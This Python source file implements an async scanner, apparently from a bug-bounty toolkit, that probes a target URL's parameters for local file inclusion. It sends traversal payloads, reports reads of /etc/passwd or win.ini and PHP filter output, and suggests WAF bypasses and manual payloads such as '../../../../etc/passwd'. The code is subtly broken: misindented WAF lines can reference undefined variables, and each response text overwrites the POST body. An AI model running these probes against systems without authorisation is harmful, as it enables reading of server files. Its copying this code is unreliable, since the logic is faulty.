"""LFI 路径遍历检测工具"""

from typing import Optional

from ..client import HttpClient
from ..data.waf import waf_precheck
from ..data import LFI_PAYLOADS
from ..utils import normalize_url
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse


async def bb_lfi(
    url: str,
    params: str = "",
    proxy: Optional[str] = None,
    cookie: Optional[str] = None, auth_token: Optional[str] = None,
    timeout: int = 15,
    waf_mode: str = "safe",
    max_retries_on_block: int = 3,
    request_delay: float = 0.5,
    method: str = "GET",
    body: str = "",
) -> str:
    """
    LFI 路径遍历检测

    Args:
        url: 目标 URL（含文件参数）
        params: 参数字段名（逗号分隔），默认自动提取
        proxy: 代理地址（可选）
        cookie: Cookie（可选）
        timeout: 超时秒数（默认 15）

    Returns:
        LFI 检测结果
    """
    url = normalize_url(url)
    results = []
    results.append(f"[*] LFI 检测目标: {url}")
    results.append(f"[*] Payload 数: {len(LFI_PAYLOADS)}")
    results.append("")

    client = HttpClient(timeout=timeout, proxy=proxy, cookie=cookie, auth_token=auth_token)
    # WAF 预检
    if waf_mode != "off":
        _w = await waf_precheck(url, waf_mode=waf_mode, request_delay=request_delay, proxy=proxy, cookie=cookie, auth_token=auth_token)
        if _w["waf_detected"]:
            _wn = _w.get("waf_name","")
    _wd = _w.get("delay",0)
    results.append(f"[!] WAF 检测: " + _wn + " 自动降速至 " + str(_wd) + "s")
    for s in _w["suggestions"]:
        results.append(f"    绕过: " + s)


    test_params = [p.strip() for p in params.split(",") if p.strip()]
    if not test_params:
        parsed = urlparse(url)
        test_params = list(parse_qs(parsed.query).keys())

    if not test_params:
        results.append("[!] 未找到参数，请提供含文件参数的 URL")
        return "\n".join(results)

    # 基线请求
    try:
        base_resp = await client.get(url)
        base_len = len(base_resp.content)
        _as = "required" if base_resp.status_code in (401,403) else "none"
        results.append(f"[AUTH: {_as}] HTTP {base_resp.status_code}")
    except Exception:
        base_len = 0

    findings = []

    for param in test_params:
        for payload in LFI_PAYLOADS:
            try:
                parsed = urlparse(url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [payload]
                new_qs = urlencode(qs, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_qs))
                if method.upper() == "POST":
                    resp = await client.post(url, data=body or {param: payload})
                else:
                    resp = await client.get(new_url)
                body = resp.text

                indicators = []
                # Linux 文件读取成功
                if "root:" in body and ":" in body[:200]:
                    indicators.append("/etc/passwd 读取成功")
                # Windows 文件读取
                if "[fonts]" in body or "for 16-bit" in body:
                    indicators.append("win.ini 读取成功")
                # Base64 PHP filter
                if "PD9" in body or "base64" in body.lower():
                    indicators.append("PHP filter 返回了 Base64 编码")
                # 响应大小变化
                if base_len and abs(len(resp.content) - base_len) > 500:
                    indicators.append(f"响应大小变化 ({base_len} → {len(resp.content)})")

                if indicators:
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "status": resp.status_code,
                        "indicators": indicators,
                    })
            except Exception:
                pass

    if not findings:
        results.append("[-] 未检测到 LFI 路径遍历")
        results.append("")
        results.append("[*] 手动尝试:")
        results.append("  🔹 ../../../../etc/passwd")
        results.append("  🔹 ....//....//....//....//etc/passwd")
        results.append("  🔹 使用 PHP wrapper: php://filter/convert.base64-encode/resource=index.php")
    else:
        results.append(f"[!] 发现 {len(findings)} 个 LFI 路径:")
        results.append("")
        for f in findings[:10]:
            results.append(f"  参数: {f['param']}")
            results.append(f"  Payload: {f['payload']}")
            results.append(f"  状态码: {f['status']}")
            results.append(f"  指标: {'; '.join(f['indicators'])}")
            results.append("")

    return "\n".join(results)
